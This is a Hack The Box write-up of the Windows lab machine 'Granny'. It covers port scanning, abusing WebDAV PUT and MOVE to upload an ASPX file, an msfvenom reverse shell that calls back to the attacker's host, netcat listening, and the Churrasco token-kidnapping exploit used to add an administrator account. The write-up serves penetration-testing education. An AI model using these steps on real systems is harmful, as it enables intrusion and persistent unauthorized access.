---
title: Granny
date: 2022-06-11 14:41:14
img: /medias/images/granny/Granny.png
author: 0xma
categories: 
  - windows
  - hackthebox
tags:
  - htb-granny
  - ctf
  - hackthebox
  - webdav
  - aspx
  - webshell
  - htb-devel
  - meterpreter
  - windows
  - ms14-058
  - local_exploit_suggester
  - pwk
  - cadaver
  - oscp-like
---
# [Easy] Granny

## Reconnaissance

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```bash
sudo bash ~/Documents/Tools/nmapAutomator/nmapAutomator.sh 10.129.95.234 All
```

- **All**: Runs all the scans consecutively.

We get back the following result.

```bash
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ sudo bash ~/Documents/Tools/nmapAutomator/nmapAutomator.sh 10.129.95.234 All 

Running all scans on 10.129.95.234

Host is likely running Windows

---------------------Starting Nmap Quick Scan---------------------

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-07 05:27 EST
Nmap scan report for 10.129.95.234
Host is up (0.19s latency).
Not shown: 999 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds

---------------------Starting Nmap Basic Scan---------------------

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-07 05:28 EST
Nmap scan report for 10.129.95.234
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Sun, 07 Nov 2021 10:28:19 GMT
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds

----------------------Starting Nmap UDP Scan----------------------
                                                                                                                              
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-07 05:28 EST
Nmap scan report for 10.129.95.234
Host is up.
All 1000 scanned ports on 10.129.95.234 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 202.48 seconds

---------------------Starting Nmap Full Scan----------------------
                                                                                                                              
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-07 05:31 EST
Initiating Parallel DNS resolution of 1 host. at 05:31
Completed Parallel DNS resolution of 1 host. at 05:31, 0.07s elapsed
Initiating SYN Stealth Scan at 05:31
Scanning 10.129.95.234 [65535 ports]
Discovered open port 80/tcp on 10.129.95.234
SYN Stealth Scan Timing: About 7.73% done; ETC: 05:38 (0:06:10 remaining)
SYN Stealth Scan Timing: About 16.87% done; ETC: 05:37 (0:05:01 remaining)
SYN Stealth Scan Timing: About 28.51% done; ETC: 05:37 (0:03:48 remaining)
SYN Stealth Scan Timing: About 36.99% done; ETC: 05:37 (0:03:26 remaining)
SYN Stealth Scan Timing: About 52.29% done; ETC: 05:36 (0:02:18 remaining)
SYN Stealth Scan Timing: About 68.73% done; ETC: 05:36 (0:01:22 remaining)
SYN Stealth Scan Timing: About 79.28% done; ETC: 05:36 (0:00:55 remaining)
Completed SYN Stealth Scan at 05:36, 262.74s elapsed (65535 total ports)
Nmap scan report for 10.129.95.234
Host is up (0.19s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 262.90 seconds
           Raw packets sent: 131247 (5.775MB) | Rcvd: 522 (48.824KB)

No new ports
                                                                                                                              

---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                              
Running CVE scan on basic ports
                                                                                                                              
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-07 05:36 EST
Nmap scan report for 10.129.95.234
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| vulners: 
|   cpe:/a:microsoft:internet_information_server:6.0: 
|       SSV:2903        10.0    https://vulners.com/seebug/SSV:2903     *EXPLOIT*
|       PACKETSTORM:82956       10.0    https://vulners.com/packetstorm/PACKETSTORM:82956       *EXPLOIT*
|       MSF:EXPLOIT/WINDOWS/IIS/MS01_033_IDQ    10.0    https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/IIS/MS01_033_IDQ  *EXPLOIT*
|       MS01_033        10.0    https://vulners.com/canvas/MS01_033     *EXPLOIT*
|       EDB-ID:20933    10.0    https://vulners.com/exploitdb/EDB-ID:20933      *EXPLOIT*
|       EDB-ID:20932    10.0    https://vulners.com/exploitdb/EDB-ID:20932      *EXPLOIT*
|       EDB-ID:20931    10.0    https://vulners.com/exploitdb/EDB-ID:20931      *EXPLOIT*
|       EDB-ID:20930    10.0    https://vulners.com/exploitdb/EDB-ID:20930      *EXPLOIT*
|       EDB-ID:16472    10.0    https://vulners.com/exploitdb/EDB-ID:16472      *EXPLOIT*
|       CVE-2008-0075   10.0    https://vulners.com/cve/CVE-2008-0075
|       CVE-2001-0500   10.0    https://vulners.com/cve/CVE-2001-0500
|       SSV:30067       7.5     https://vulners.com/seebug/SSV:30067    *EXPLOIT*
|       CVE-2007-2897   7.5     https://vulners.com/cve/CVE-2007-2897
|       SSV:2902        7.2     https://vulners.com/seebug/SSV:2902     *EXPLOIT*
|       CVE-2008-0074   7.2     https://vulners.com/cve/CVE-2008-0074
|       EDB-ID:2056     6.5     https://vulners.com/exploitdb/EDB-ID:2056       *EXPLOIT*
|       EDB-ID:585      5.0     https://vulners.com/exploitdb/EDB-ID:585        *EXPLOIT*
|       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
|       MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS     4.3     https://vulners.com/metasploit/MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS    *EXPLOIT*
|_      EDB-ID:15167    4.3     https://vulners.com/exploitdb/EDB-ID:15167      *EXPLOIT*
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds

Running Vuln scan on basic ports
                                                                                                                              
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-07 05:36 EST
Nmap scan report for 10.129.95.234
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-enum: 
|   /_vti_bin/: Frontpage file or folder
|   /_vti_log/: Frontpage file or folder
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|   /_vti_bin/shtml.exe: Frontpage file or folder
|   /images/: Potentially interesting folder
|_  /_private/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:microsoft:internet_information_server:6.0: 
|       SSV:2903        10.0    https://vulners.com/seebug/SSV:2903     *EXPLOIT*
|       PACKETSTORM:82956       10.0    https://vulners.com/packetstorm/PACKETSTORM:82956       *EXPLOIT*
|       MSF:EXPLOIT/WINDOWS/IIS/MS01_033_IDQ    10.0    https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/IIS/MS01_033_IDQ  *EXPLOIT*
|       MS01_033        10.0    https://vulners.com/canvas/MS01_033     *EXPLOIT*
|       EDB-ID:20933    10.0    https://vulners.com/exploitdb/EDB-ID:20933      *EXPLOIT*
|       EDB-ID:20932    10.0    https://vulners.com/exploitdb/EDB-ID:20932      *EXPLOIT*
|       EDB-ID:20931    10.0    https://vulners.com/exploitdb/EDB-ID:20931      *EXPLOIT*
|       EDB-ID:20930    10.0    https://vulners.com/exploitdb/EDB-ID:20930      *EXPLOIT*
|       EDB-ID:16472    10.0    https://vulners.com/exploitdb/EDB-ID:16472      *EXPLOIT*
|       CVE-2008-0075   10.0    https://vulners.com/cve/CVE-2008-0075
|       CVE-2001-0500   10.0    https://vulners.com/cve/CVE-2001-0500
|       SSV:30067       7.5     https://vulners.com/seebug/SSV:30067    *EXPLOIT*
|       CVE-2007-2897   7.5     https://vulners.com/cve/CVE-2007-2897
|       SSV:2902        7.2     https://vulners.com/seebug/SSV:2902     *EXPLOIT*
|       CVE-2008-0074   7.2     https://vulners.com/cve/CVE-2008-0074
|       EDB-ID:2056     6.5     https://vulners.com/exploitdb/EDB-ID:2056       *EXPLOIT*
|       CVE-2006-0026   6.5     https://vulners.com/cve/CVE-2006-0026
|       EDB-ID:585      5.0     https://vulners.com/exploitdb/EDB-ID:585        *EXPLOIT*
|       CVE-2005-2678   5.0     https://vulners.com/cve/CVE-2005-2678
|       CVE-2003-0718   5.0     https://vulners.com/cve/CVE-2003-0718
|       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
|       MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS     4.3     https://vulners.com/metasploit/MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS    *EXPLOIT*
|       EDB-ID:15167    4.3     https://vulners.com/exploitdb/EDB-ID:15167      *EXPLOIT*
|       CVE-2010-1899   4.3     https://vulners.com/cve/CVE-2010-1899
|       CVE-2005-2089   4.3     https://vulners.com/cve/CVE-2005-2089
|_      CVE-2003-1582   2.6     https://vulners.com/cve/CVE-2003-1582
|_http-server-header: Microsoft-IIS/6.0
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 582.73 seconds

---------------------Recon Recommendations----------------------
                                                                                                                              

Web Servers Recon:
                                                                                                                              
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -k -x .html,.asp,.php -u http://10.129.95.234:80 -o recon/gobuster_10.129.95.234_80.txt
nikto -host 10.129.95.234:80 | tee recon/nikto_10.129.95.234_80.txt

Which commands would you like to run?                                                                                         
All (Default), gobuster, nikto, Skip <!>

Running Default in (1) s:  

---------------------Running Recon Commands----------------------
                                                                                                                              

Starting gobuster scan
                                                                                                                              
Error: unknown shorthand flag: 'l' in -l

Finished gobuster scan
                                                                                                                              
=========================
                                                                                                                              
Starting nikto scan
                                                                                                                              
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.95.234
+ Target Hostname:    10.129.95.234
+ Target Port:        80
+ Start Time:         2021-11-07 05:46:34 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-397: HTTP method 'PUT' allows clients to save files on the web server.
+ OSVDB-5646: HTTP method 'DELETE' allows clients to delete files on the web server.
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPPATCH MKCOL UNLOCK LOCK COPY PROPFIND SEARCH listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://granny/_vti_bin/_vti_aut/author.dll
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_private/: FrontPage directory found.
+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8071 requests: 0 error(s) and 32 item(s) reported on remote host
+ End Time:           2021-11-07 06:14:06 (GMT-5) (1652 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

Finished nikto scan
                                                                                                                              
=========================
                                                                                                                              
                                                                                                                              
                                                                                                                              
---------------------Finished all Nmap scans---------------------                                                             
                                                                                                                              

Completed in 46 minute(s) and 7 second(s)
```

We have one port open.

- **Port 80:** running Microsoft IIS httpd 6.0

Before we move on to enumeration, let’s make some mental notes about the scan results.

- The only port that is open is port 80 so this will definitely be our point of entry. The port is running an outdated version of Microsoft-IIS and is using the WebDAV protocol. One thing that pops out right away is the number of allowed HTTP methods. As mentioned in the scan results, these methods could potentially allow you to add, delete and move files on the web server.

## Enumeration

Visit the web application in the browser.

![Untitled](/medias/images/granny/Untitled.png)

Look into the directories/files that gobuster found. We don’t find anything useful. Next, let’s test the allowed HTTP methods.

The scan shows that the HTTP PUT method is allowed. This could potentially give us the ability to save files on the web server. Since this is a Microsoft IIS web server, the type of files it executes are
ASP and ASPX. So let’s check if we’re allowed to upload these file extensions.

```bash
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ davtest --url http://10.129.95.234
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.129.95.234
********************************************************
NOTE    Random string for this session: gs_Oaz1ly
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.129.95.234/DavTestDir_gs_Oaz1ly
********************************************************
 Sending test files
PUT     php     SUCCEED:        http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.php
PUT     jhtml   SUCCEED:        http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.jhtml
PUT     asp     FAIL
PUT     cfm     SUCCEED:        http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.cfm
PUT     html    SUCCEED:        http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.html
PUT     aspx    FAIL
PUT     jsp     SUCCEED:        http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.jsp
PUT     cgi     FAIL
PUT     shtml   FAIL
PUT     txt     SUCCEED:        http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.txt
PUT     pl      SUCCEED:        http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.pl
********************************************************
 Checking for test file execution
EXEC    php     FAIL
EXEC    jhtml   FAIL
EXEC    cfm     FAIL
EXEC    html    SUCCEED:        http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.html
EXEC    jsp     FAIL
EXEC    txt     SUCCEED:        http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.txt
EXEC    pl      FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.95.234/DavTestDir_gs_Oaz1ly
PUT File: http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.php
PUT File: http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.jhtml
PUT File: http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.cfm
PUT File: http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.html
PUT File: http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.jsp
PUT File: http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.txt
PUT File: http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.pl
Executes: http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.html
Executes: http://10.129.95.234/DavTestDir_gs_Oaz1ly/davtest_gs_Oaz1ly.tx
```

Both ASP and ASPX are not allowed. However, TXT and HTML files are. Remember that the PUT HTTP method was not the only method that was allowed. We also can use the MOVE method. The MOVE method not only can be used to change file locations on the web server, but it can also be
used to rename files. Let’s try to upload an HTML file on the web server and then rename it to change the extension to an ASPX file.

![Untitled](/medias/images/granny/Untitled%201.png)

We confirm that the HTML file was correctly uploaded on the web server. Next, let’s change the extension of the HTML file to ASPX.

![Untitled](/medias/images/granny/Untitled%202.png)

```bash
curl -X MOVE --header 'Destination:http://10.129.95.234/pwn.aspx' 'http://10.129.95.234/pwn.html'
```

Perfect! Now we have confirmed that we can successfully upload and execute ASPX code on the web server.

## Initial Foothold

Generate an ASPX reverse shell using msfvenom.

```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.50 LPORT=4242 -o shell.aspx
```

- **p**: payload
- **f**: format
- **LHOST**: attack machine’s (kali) IP address
- **LPORT**: the port you want to send the reverse shell to
- **o**: where to save the payload

Rename the file to *shell.txt* so that we can upload it on the server.

```bash
mv shell.aspx shell.txt
```

Then upload the file on the web server and change the file extension to ASPX.

```bash
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ curl -X PUT http://10.129.95.234/shell.txt --data-binary @shell.txt            
                                                                                                                              
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ curl -X MOVE --header 'Destination:http://10.129.95.234/shell.aspx' 'http://10.129.95.234/shell.txt'
```

![Untitled](/medias/images/granny/Untitled%203.png)

Next, set up a listener on your attack machine.

```bash
nc -lvnp 4242
```

Execute the *shell.aspx* file (either through the browser or the *curl* command) to send a shell back to our attack machine.

![Untitled](/medias/images/granny/Untitled%204.png)

We get a shell! Unfortunately, we don’t have permission to view the *user.txt* flag, so we need to escalate privileges.

![Untitled](/medias/images/granny/Untitled%205.png)

## Privilege Escalation

We’ll use [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) to identify any missing patches on the Windows target machine that could potentially allow us to escalate privileges.

```bash
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ python2 ~/Documents/Tools/Windows-Exploit-Suggester/windows-exploit-suggester.py --update                                                 1 ⚙
[*] initiating winsploit version 3.3...
[+] writing to file 2021-11-07-mssb.xls
[*] done
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ python2 ~/Documents/Tools/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2021-11-07-mssb.xls --systeminfo sysinfo.txt  1 ⚙
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2003 SP2 32-bit'
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*] 
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*] 
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done
```

It outputs many vulnerabilities. I tried several of them, but none of them worked except for the [Microsoft Windows Server 2003 — Token Kidnapping Local Privilege Escalation](https://www.exploit-db.com/exploits/6705) exploit. Grab the executable [from here](https://github.com/Re4son/Churrasco) and transfer it to the attack machine in the same way we transferred the reverse shell.

```bash
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ cp ~/Documents/revshell/windows/Churrasco/churrasco.exe .                                                                                 1 ⚙
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ mv churrasco.exe churrasco.txt                                                                                                            1 ⚙
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ curl -X PUT http://10.129.95.234/churrasco.txt --data-binary @churrasco.txt                                                               1 ⚙
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ curl -X MOVE --header 'Destination:http://10.129.95.234/churrasco.exe' 'http://10.129.95.234/churrasco.txt'
```

![Untitled](/medias/images/granny/Untitled%206.png)

Let’s use the executable to add a user on the system that is part of the *Administrators* group.

```bash
churrasco.exe "net user test test /add && net localgroup Administrators test /add"
```

The command completes successfully.

![Untitled](/medias/images/granny/Untitled%207.png)

However, when I try to use the “*runas*” command to switch to that user it doesn’t work. Maybe User Account Control (UAC) is enabled and the “*runas*” command does not elevate your privileges. So I figured maybe I could get it working using PowerShell as explained in [this article](https://medium.com/@asfiyashaikh10/windows-privilege-escalation-using-sudo-su-ae5573feccd9), but PowerShell is not installed on the machine!

So all you can do is use the exploit to view the *user.txt* and *root.txt* flags. I however, like to get a privileged shell on each box I solve and so I’m going to use Metasploit to get a shell on this box.

## Extra Content: Metasploit Solution

I’m going to skim through this part since there are a ton of write ups out there that show how to solve this box using Metasploit.

